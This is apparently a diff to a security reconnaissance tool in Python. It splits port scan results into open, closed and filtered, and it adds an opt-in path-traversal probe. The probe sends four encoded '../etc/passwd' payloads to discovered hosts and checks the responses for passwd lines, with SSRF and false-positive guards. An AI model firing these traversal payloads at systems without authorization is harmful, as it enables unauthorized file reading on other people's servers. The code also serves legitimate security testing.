@@ -722,49 +722,65 @@ def cve_matches(product, version) -> list:
         key=lambda e: e["cve"])
 
 
-def _grab_banner(host: str, port: int, timeout: float):
-    """Connect to one TCP port; return the banner it volunteers (may be ''), or
-    None if the port did not accept a connection.
+def _probe_port(host: str, port: int, timeout: float) -> tuple:
+    """Connect to one TCP port. Returns (state, banner):
+      ("open",     banner)  — accepted; banner is what it volunteered (may be "")
+      ("closed",   "")      — actively refused (RST): host up, nothing listening
+      ("filtered", "")      — no response before the timeout: a firewall/CDN is
+                              silently dropping the connection
 
-    occam: passive banner grab — reads only what a service says first, sends
-    nothing. Services that speak first (SSH/FTP/SMTP) yield a version; HTTP-style
-    ports stay open with an empty banner (recorded, no version). '' (open, silent)
-    and None (closed/filtered) are different answers and stay different (I-1)."""
+    The closed/filtered split is the whole point of a scan against a modern host:
+    most ports there are *filtered*, not closed, and the two are different facts —
+    "refused" vs "no answer" — so they stay different (I-1). occam: connect scan
+    can't see nmap's open|filtered nuance; a raw-SYN scan needs root and is a
+    separate provider. Passive banner only — reads what a service says first,
+    sends nothing."""
     try:
         with socket.create_connection((host, port), timeout=timeout) as s:
             s.settimeout(timeout)
             try:
-                return s.recv(256).decode("latin-1", "replace").strip()
-            except (socket.timeout, OSError):
-                return ""            # open, but volunteered nothing
-    except (OSError, ValueError):
-        return None                  # closed / filtered / unreachable
+                return "open", s.recv(256).decode("latin-1", "replace").strip()
+            except OSError:                       # open, but volunteered nothing
+                return "open", ""
+    except ConnectionRefusedError:
+        return "closed", ""
+    except (socket.timeout, TimeoutError):
+        return "filtered", ""
+    except OSError:
+        return "filtered", ""                     # unreachable / reset-less drop
 
 
 def scan_host(host: str, ports=None, timeout: float = 4.0, workers: int = 32) -> dict:
     """Scan `host` over TCP. Returns an observation dict (never a risk claim):
-      open_ports: [int]                              — ports that answered
-      services:   [{port, banner, product, version}] — what each open port said
-      cves:       [{port, product, version, cve, summary, severity, ...}]
+      scanned:        int                              — how many ports we tried
+      open_ports:     [int]                            — ports that accepted
+      filtered_ports: [int]                            — ports that dropped us
+      services:       [{port, banner, product, version}] — what each open port said
+      cves:           [{port, product, version, cve, summary, severity, ...}]
+    (closed ports are the boring majority — counted via `scanned`, not stored.)
     {} if `host` is not a safe, globally-routable target — the same SSRF guard
     every probe uses: a discovered name pointing inward is never connected to."""
     ports = list(_DEFAULT_PORTS) if ports is None else list(ports)   # [] means none, not default
     if not ports or not _resolvable_and_global(host):
         return {}
-    open_ports, services, cves = [], [], []
+    open_ports, filtered, services, cves = [], [], [], []
     with concurrent.futures.ThreadPoolExecutor(max_workers=min(workers, len(ports))) as ex:
-        for port, banner in zip(ports, ex.map(lambda p: _grab_banner(host, p, timeout), ports)):
-            if banner is None:
-                continue             # port didn't answer — established nothing
-            open_ports.append(port)
-            product, version = parse_banner(banner)
-            services.append({"port": port, "banner": banner[:200],
-                             "product": product, "version": version})
-            for hit in cve_matches(product, version):
-                cves.append({"port": port, "product": product, "version": version, **hit})
-    obs: dict = {}
+        for port, (state, banner) in zip(ports, ex.map(lambda p: _probe_port(host, p, timeout), ports)):
+            if state == "filtered":
+                filtered.append(port)
+            elif state == "open":
+                open_ports.append(port)
+                product, version = parse_banner(banner)
+                services.append({"port": port, "banner": banner[:200],
+                                 "product": product, "version": version})
+                for hit in cve_matches(product, version):
+                    cves.append({"port": port, "product": product, "version": version, **hit})
+            # "closed": host up, nothing listening — reflected in `scanned` only
+    obs: dict = {"scanned": len(ports)}
     if open_ports:
         obs["open_ports"] = sorted(open_ports)
+    if filtered:
+        obs["filtered_ports"] = sorted(filtered)
     if services:
         obs["services"] = services
     if cves:
@@ -793,3 +809,78 @@ def enrich_scan(g, ports=None, timeout: float = 4.0, workers: int = 8) -> int:
                     ent.evidence["known_vulnerable_service"] = True
                     vulnerable += 1
     return vulnerable
+
+
+# --- path-traversal probe -------------------------------------------------
+# Active, and the same control-gated discipline as admin_probe/exposure_probe:
+# try a handful of traversal payloads for a file with a known signature, and
+# assert only if the response BOTH differs from this host's "nothing here" answer
+# AND actually contains the file. A 200 alone proves nothing (soft-404 / SPA /
+# catch-all); a body with a real /etc/passwd root line proves arbitrary file read.
+#
+# The payloads are the same string four ways — plain, URL-encoded, doubled, and
+# fully percent-encoded — because a naive filter often strips one form and misses
+# the rest. occam: path-based payloads against `/` only, targeting the classic
+# webroot / static-handler traversal (the quick win a hunter tries first). Real
+# traversal usually lives in a request PARAMETER (?file=../../etc/passwd);
+# discovering parameters is a bigger job — add a param-fuzzing provider when it
+# matters. Signature is Unix /etc/passwd; add win.ini when a Windows target needs it.
+_TRAVERSAL_PAYLOADS = (
+    "/../../../../../../../../etc/passwd",
+    "/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd",
+    "/....//....//....//....//....//etc/passwd",
+    "/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
+)
+_PASSWD_RE = re.compile(r"(?m)^[a-z_][a-z0-9_-]*:[^:]*:\d+:\d+:")   # a real passwd line
+
+
+def traversal_evidence(control: tuple, responses: dict) -> dict:
+    """Pure: (control response shape, {payload: (status, headers, body)}) -> evidence.
+
+    Both conditions required, same as sensitive_evidence: the payload must not
+    answer the way this host answers for something absent (else it's a catch-all),
+    and the body must actually be an /etc/passwd. Never asserts False — the
+    payloads coming back empty means we tried them, not that traversal is
+    impossible (invariant I-1)."""
+    for status, headers, body in responses.values():
+        if not status:
+            continue                          # never reached it: established nothing
+        if _shape(status, headers, body) == control:
+            continue                          # answers like a path that isn't there
+        if status == 200 and _PASSWD_RE.search(body):
+            return {"path_traversal": True}
+    return {}
+
+
+def traversal_probe(host: str, timeout: float = 8.0) -> dict:
+    """Probe one host for path traversal. Returns evidence; {} establishes nothing.
+    Control request first — it picks the scheme and defines 'nothing here', so an
+    unreachable host costs exactly one request (same shape as exposure_probe)."""
+    if not _resolvable_and_global(host):
+        return {}
+    for scheme in ("https", "http"):
+        status, headers, body = _fetch(f"{scheme}://{host}{_CONTROL_PATH}", timeout)
+        if status:
+            return traversal_evidence(
+                _shape(status, headers, body),
+                {p: _fetch(f"{scheme}://{host}{p}", timeout) for p in _TRAVERSAL_PAYLOADS})
+    return {}
+
+
+@declares("traversal_probe", ("path_traversal",))
+def enrich_traversal(g, timeout: float = 8.0, workers: int = 8) -> int:
+    """Attach path-traversal evidence to every probeable node. Returns hosts marked.
+
+    Requests control + N payloads per host against someone else's infrastructure,
+    so it rides the same opt-in active tier (`--probe-paths`) as admin_probe and
+    exposure_probe. Writes only to `Entity.evidence`."""
+    targets = [e for e in g.nodes.values() if e.type in _PROBEABLE]
+    if not targets:
+        return 0
+    marked = 0
+    with concurrent.futures.ThreadPoolExecutor(max_workers=workers) as ex:
+        for ent, ev in zip(targets, ex.map(lambda e: traversal_probe(e.value, timeout), targets)):
+            if ev:
+                ent.evidence.update(ev)
+                marked += 1
+    return marked
